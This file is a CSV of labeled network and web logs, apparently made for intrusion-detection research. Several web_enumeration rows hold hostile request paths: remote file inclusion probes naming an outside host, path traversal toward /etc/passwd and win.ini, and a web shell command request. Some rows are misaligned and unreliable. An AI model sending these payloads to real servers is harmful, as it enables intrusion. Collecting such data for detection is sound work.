@timestamp,src_ip,src_port,dst_ip,dst_port,Protocol,http_request_method,http_request_referrer,http_response_code,url_path,user_agent_original,sql_method,sql_query,category,label_
1666590680,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666591600,0,0,127.0.0.1,8080,0,0,0,0,0,0,0,0,sql_enumeration,3
1666692109,10.132.100.50,0,10.132.100.52,0,UDP,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53138,192.168.33.12,0,HTTP,0,0,0,/forum1_professionnel.asp,0,0,0,web_enumeration,2
1666591237,10.0.0.20,33752,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'large_crop' LIMIT 1,sql_enumeration,0
1666703744, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692145,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/inventory,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/web/lom.php?ETCDIR=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666527916,192.168.0.3,0,0,0,0,0,0,0,0,0,0,0,smtp_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/bd,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582486,192.168.207.142,0,0,0,HTTPS,GET,0,404,/symphony/README.markdown,Mozilla/5.00,0,0,web_enumeration,1
1666722168, 172.24.2.11 ,0,172.24.2.100,0,HTTP,GET,0,404,/page3.php,gobuster/3.2.0-dev,0,0,web_enumeration,3
1666582479,192.168.207.142,0,0,0,HTTPS,GET,0,404,/footer.php?footer_file=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666591997,10.0.0.20,34398,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent-comments' LIMIT 1,sql_enumeration,0
1666692056,10.32.4.176,35754,10.132.100.52,783,TCP,0,0,0,0,0,0,0,port_scan,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666698058, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692123,10.132.101.52,38270,10.132.101.101,3306,TCP,0,0,0,0,0,0,0,port_scan,0
1666692139,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580398,192.168.207.142,0,0,0,HTTPS,GET,0,404,/test/phpinfo.php,Mozilla/5.00,0,0,web_enumeration,1
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/wapchat/src/eng.searchMember.php?sysFileDir=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691984,10.32.4.176,50742,10.132.100.53,4279,TCP,0,0,0,0,0,0,0,port_scan,0
1666630552,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692109,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666580406,192.168.207.142,0,0,0,HTTPS,GET,0,200,/?q[]=x,Mozilla/5.00,0,0,web_enumeration,1
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666590637,10.0.0.20,33244,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT wp_posts.* FROM wp_posts WHERE ID IN (1),sql_enumeration,0
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/configs.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691999,10.132.100.53,445,10.32.4.176,50174,TCP,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/servers,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580397,192.168.207.142,0,0,0,HTTPS,GET,0,404,/forum_professionnel.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,Mozilla/5.00,0,0,web_enumeration,1
1666692057,10.32.4.176,55166,10.132.100.52,8600,TCP,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691983,10.32.4.176,56394,10.132.100.53,5631,TCP,0,0,0,0,0,0,0,port_scan,0
1666695906, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691945,100.64.19.103,37502,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666590957,10.0.0.20,33518,10.0.0.21,3306,mysql,0,0,0,0,0,SET,"SET SESSION sql_mode='ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'",sql_enumeration,0
1666542079,192.168.106.1,50721,192.168.106.130,53,2022-10-24 00:20:56 ALLOW UDP 192.168.106.1 192.168.106.130 50721 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666692057,10.32.4.176,56296,10.132.100.52,6001,TCP,0,0,0,0,0,0,0,port_scan,0
1666590887,10.0.0.20,33456,10.0.0.21,3306,mysql,0,0,0,0,0,SET,SET NAMES 'utf8mb4' COLLATE 'utf8mb4_unicode_ci',sql_enumeration,0
1666580401,192.168.207.142,0,0,0,HTTPS,GET,0,404,/biblioteca/bib_plsearchc.php?CLASSPATH=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666700866, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666704056, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/shop/skin/adminhtml/default/default/media/editor.swf,Mozilla/5.00,0,0,web_enumeration,1
1666541336,127.0.0.1,53174,127.0.0.1,1120,2022-10-24 00:08:25 ALLOW TCP 127.0.0.1 127.0.0.1 53174 1120 0 - 0 0 0 - - - SEND 6624,TCP,0,0,0,0,0,0,port_scan,3
1666580403,192.168.207.142,0,0,0,HTTPS,GET,0,404,/info.php?file=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691930,100.64.19.103,43582,100.64.19.22,32777,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666590847,10.0.0.20,33422,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'large_crop' LIMIT 1,sql_enumeration,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/invite,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/intranet/browse.php,0,0,0,web_enumeration,2
1666691984,10.32.4.176,54080,10.132.100.53,1840,TCP,0,0,0,0,0,0,0,port_scan,0
1666542079,0,61982,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/demo,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582475,192.168.207.142,0,0,0,HTTPS,GET,0,404,/doc/ASX-TCH,Mozilla/5.00,0,0,web_enumeration,1
1666692043,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541306,127.0.0.1,53085,127.0.0.1,5601,2022-10-24 00:08:01 ALLOW TCP 127.0.0.1 127.0.0.1 53085 5601 0 - 0 0 0 - - - RECEIVE 2728,TCP,0,0,0,0,0,0,port_scan,3
1666690178,192.168.34.11,53110,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/ax0admin.cgi,0,0,0,web_enumeration,2
1666591380,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666580390,192.168.207.142,0,0,0,HTTPS,GET,0,404,/bugs.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692056,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541447,192.168.1.225,58364,8.241.155.126,80,2022-10-24 00:10:29 ALLOW TCP 192.168.1.225 8.241.155.126 58364 80 0 - 0 0 0 - - - SEND 7856,TCP,0,0,0,0,0,0,port_scan,1
1666692056,10.32.4.176,47728,10.132.100.52,1100,TCP,0,0,0,0,0,0,0,port_scan,0
1666582482,192.168.207.142,0,0,0,HTTPS,GET,0,404,/src/browser/resource/categories/resource_categories_view.php?CLASSES_ROOT=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666631527,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1664373680,192.168.91.15,50768,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/project,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692055,10.32.4.176,38368,10.132.100.52,445,TCP,0,0,0,0,0,0,0,port_scan,0
1666692145,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/uploader,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692145,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692055,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666541336,0,53219,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691985,10.32.4.176,54644,10.132.100.53,3007,TCP,0,0,0,0,0,0,0,port_scan,0
1666591220,0,0,10.0.0.22,5044,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692064,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666630903,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666630462,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692056,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666630756,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/happening.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666542734,192.168.1.254,33947,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666690179,192.168.34.11,53234,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/mojo/mojo.cgi,0,0,0,web_enumeration,2
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692139,10.132.100.52,22,10.32.4.176,42960,TCP,0,0,0,0,0,0,0,port_scan,0
1666692145,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/adminer-4.3.1-mysql-en.php,Mozilla/5.00,0,0,web_enumeration,1
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666698174, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666630700,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/netstat,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691929,100.64.19.103,58980,100.64.19.22,1234,TCP,0,0,0,0,0,0,0,port_scan,3
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/mine.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692057,10.32.4.176,42718,10.132.100.52,1028,TCP,0,0,0,0,0,0,0,port_scan,0
1666692139,10.132.101.52,55716,10.132.101.101,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/w3,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591417,10.0.0.20,33910,10.0.0.21,3306,mysql,0,0,0,0,0,UPDATE,UPDATE `wp_options` SET `option_value` = '1666591417.8780860900878906250000' WHERE `option_name` = '_transient_doing_cron',sql_enumeration,0
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691985,10.32.4.176,46250,10.132.100.53,1900,TCP,0,0,0,0,0,0,0,port_scan,0
1666580394,192.168.207.142,0,0,0,HTTPS,GET,0,404,/SiteServer/admin/,Mozilla/5.00,0,0,web_enumeration,1
1666591697,10.0.0.20,34146,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN (1) ORDER BY meta_id ASC",sql_enumeration,0
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541336,0,53241,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666691984,10.32.4.176,60600,10.132.100.53,366,TCP,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666722172, 172.24.2.11 ,0,172.24.2.100,0,HTTP,GET,0,404,/aup.php ,gobuster/3.2.0-dev,0,0,web_enumeration,3
1666691984,10.32.4.176,54738,10.132.100.53,1123,TCP,0,0,0,0,0,0,0,port_scan,0
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/sites/,Mozilla/5.00,0,0,web_enumeration,1
1666580404,192.168.207.142,0,0,0,HTTPS,GET,0,404,/templates/sidebar/template.tpl.php?renderer=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666591977,10.0.0.20,34382,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'medium_crop' LIMIT 1,sql_enumeration,0
1666542072,192.168.106.1,53293,192.168.106.130,53,2022-10-24 00:20:41 ALLOW UDP 192.168.106.1 192.168.106.130 53293 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666541373,127.0.0.1,53412,127.0.0.1,1120,2022-10-24 00:09:01 ALLOW TCP 127.0.0.1 127.0.0.1 53412 1120 0 - 0 0 0 - - - SEND 6624,TCP,0,0,0,0,0,0,port_scan,3
1666692037,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666541842,192.168.1.225,60559,172.217.194.94,443,2022-10-24 00:17:00 ALLOW UDP 192.168.1.225 172.217.194.94 60559 443 0 - - - - - - - SEND 18232,UDP,0,0,0,0,0,0,port_scan,2
1666697270, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692056,10.32.4.176,36996,10.132.100.52,787,TCP,0,0,0,0,0,0,0,port_scan,0
1666541566,0,54129,239.255.255.250,1900,0,0,0,0,0,0,0,0,port_scan,3
1666582499,192.168.207.142,0,0,0,HTTPS,GET,0,499,/uploads/shell.php?cmd=id,curl/7.84.0,0,0,web_enumeration,1
1666697940, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666542406,0,54590,127.0.0.1,5601,0,0,0,0,0,0,0,0,port_scan,3
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692139,10.132.101.52,55716,10.132.101.101,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666692058,10.32.4.176,47192,10.132.100.52,10024,TCP,0,0,0,0,0,0,0,port_scan,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/manage,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692064,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691975,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691974,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666631208,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666590790,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666541686,192.168.1.225,5353,224.0.0.251,5353,2022-10-24 00:14:13 ALLOW UDP 192.168.1.225 224.0.0.251 5353 5353 0 - - - - - - - SEND 7892,UDP,0,0,0,0,0,0,port_scan,2
1666695794, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591259,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692076,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/e,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/shop,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666541566,127.0.0.1,58429,127.0.0.1,58428,2022-10-24 00:12:18 ALLOW TCP 127.0.0.1 127.0.0.1 58429 58428 0 - 0 0 0 - - - RECEIVE 16320,TCP,0,0,0,0,0,0,port_scan,3
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/clientscript/ckeditor/CHANGES.md,Mozilla/5.00,0,0,web_enumeration,1
1666690179,192.168.34.11,53208,192.168.33.12,0,HTTP,0,0,0,/pvote/add.php,0,0,0,web_enumeration,2
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/tool,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666542072,0,53336,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666591159,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692056,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/log0reader.cgi,0,0,0,web_enumeration,2
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666416690,192.168.0.3,35252,192.168.0.2,5044,tcp,0,0,0,0,0,0,0,port_scan,2
1666721402, 172.24.2.11 ,0,172.24.2.100,0,HTTP,AQXO,0,302,0,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),0,0,web_enumeration,3
1666582463,192.168.207.142,0,0,0,HTTPS,GET,0,404,/0,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691972,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666631606,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/axis/services,Mozilla/5.00,0,0,web_enumeration,1
1664429490,192.168.91.128,58678,192.168.91.1,2,udp,0,0,0,0,0,0,0,port_scan,2
1666692123,10.32.4.176,40080,10.132.100.52,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666704381, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/weblog,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692057,10.32.4.176,46626,10.132.100.52,8443,TCP,0,0,0,0,0,0,0,port_scan,0
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/modules/fckeditor/fckconfig.js,Mozilla/5.00,0,0,web_enumeration,1
1666692056,10.32.4.176,48244,10.132.100.52,1839,TCP,0,0,0,0,0,0,0,port_scan,0
1666697928, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1664369567,192.168.91.15,55532,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666691975,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1664428820,192.168.91.128,49040,192.168.91.1,156,tcp,0,0,0,0,0,0,0,port_scan,2
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691994,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/shop/downloader/,Mozilla/5.00,0,0,web_enumeration,1
1664368126,192.168.91.15,64547,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666691973,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541336,0,53208,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666722169, 172.24.2.11 ,0,172.24.2.100,0,HTTP,GET,0,404,/plan.php,gobuster/3.2.0-dev,0,0,web_enumeration,3
1666591439,0,0,10.0.0.21,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691985,10.32.4.176,33932,10.132.100.53,1030,TCP,0,0,0,0,0,0,0,port_scan,0
1666591837,10.0.0.20,34264,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'large_crop' LIMIT 1,sql_enumeration,0
1666590819,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/send,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/passes.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692118,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53234,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666541373,0,53417,127.0.0.1,53416,0,0,0,0,0,0,0,0,port_scan,3
1666704965, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691945,100.64.19.22,8443,100.64.19.103,37536,TCP,0,0,0,0,0,0,0,port_scan,3
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/..%5C..%5C..%5C..%5C..%5C..%5C/winnt/win.ini,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/sales,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692146,10.132.100.52,80,10.32.4.176,43526,TCP,0,0,0,0,0,0,0,port_scan,0
1666692058,10.32.4.176,53550,10.132.100.52,20031,TCP,0,0,0,0,0,0,0,port_scan,0
1666541336,0,53169,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666631158,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666582466,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192.pem,Mozilla/5.00,0,0,web_enumeration,1
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/mantis/summary_graph_functions.php,0,0,0,web_enumeration,2
1666582484,192.168.207.142,0,0,0,HTTPS,GET,0,404,/spin/main.csp,Mozilla/5.00,0,0,web_enumeration,1
1666591217,10.0.0.20,33736,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT   wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ( 
  0 = 1
) AND wp_posts.post_type = 'wp_global_styles' AND ((wp_posts.post_status = 'publish'))
					GROUP BY wp_posts.ID
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 1",sql_enumeration,0
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666630910,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/kernel/class/delete.php,0,0,0,web_enumeration,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580406,192.168.207.142,0,0,0,HTTPS,GET,0,404,/webdynpro/welcome/Welcome.jsp,Mozilla/5.00,0,0,web_enumeration,1
1666542072,0,53495,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666590607,10.0.0.20,33220,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT DISTINCT t.term_id, tr.object_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id = tt.term_taxonomy_id
			WHERE tt.taxonomy IN ('category', 'post_tag', 'post_format') AND tr.object_id IN (1)
			ORDER BY t.name ASC",sql_enumeration,0
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666631566,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666580404,192.168.207.142,0,0,0,HTTPS,GET,0,404,/plugins/safehtml/safehtml.php?dir[plugins]=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
